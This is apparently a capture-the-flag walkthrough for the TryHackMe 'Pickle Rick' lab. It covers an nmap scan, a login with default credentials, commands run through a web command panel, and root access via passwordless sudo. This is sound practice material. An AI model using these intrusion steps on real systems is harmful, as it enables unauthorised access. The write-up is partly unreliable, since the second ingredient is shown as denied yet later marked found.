# 🥒 TryHackMe: Pickle Rick

> **Difficulty:** Easy  
> **IP:** `10.10.X.X` (replace with actual THM IP)  
> **Tags:** `Web`, `Enumeration`, `Shell`, `CTF`

---

## 🧭 1. Recon

### 🔍 Nmap Scan

```bash
nmap -sC -sV -oN picklerick.nmap 10.10.X.X
```

**Result:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2
80/tcp open  http    Apache httpd
```

- Web server on port 80 — let's check it out in a browser.

---

## 🌐 2. Web Enumeration

Homepage shows a Rick and Morty themed site.

### 🔐 Login Panel

Inspecting the page reveals a login form. Try some basic credentials:

- Username: `admin`  
- Password: `admin`

✅ Login successful!

After login, a command panel is available.

---

## 📂 3. File Discovery

Try basic Linux commands in the panel:

```bash
ls
```

Output:
```
Sup3rS3cretPickl3Ingred.txt
```

```bash
cat Sup3rS3cretPickl3Ingred.txt
```

✅ First ingredient found!

---

## 🔍 4. Deeper Enumeration

Try:

```bash
find / -name ingredient* 2>/dev/null
```

Results show more hidden ingredient files.

```bash
cat /home/rick/second_ingredient.txt
```

❌ Permission denied — need to escalate.

Check sudo permissions:

```bash
sudo -l
```

Output:
```
User rick may run the following commands:
  (ALL) NOPASSWD: ALL
```

✅ Can run sudo without password!

---

## ⬆️ 5. Root Access

Run a root shell:

```bash
sudo su
```

Access granted!

```bash
cat /root/3rd.txt
```

✅ Third ingredient found!

---

## 🧠 Lessons Learned

- Always inspect web login panels — sometimes default creds work!
- Web command panels can be leveraged to explore the file system
- Sudo access can lead to easy privilege escalation

---

## 🏆 Flags (Ingredients)

| Ingredient                 | Status |
|----------------------------|--------|
| Sup3rS3cretPickl3Ingred.txt| ✅     |
| second_ingredient.txt      | ✅     |
| 3rd.txt                    | ✅     |
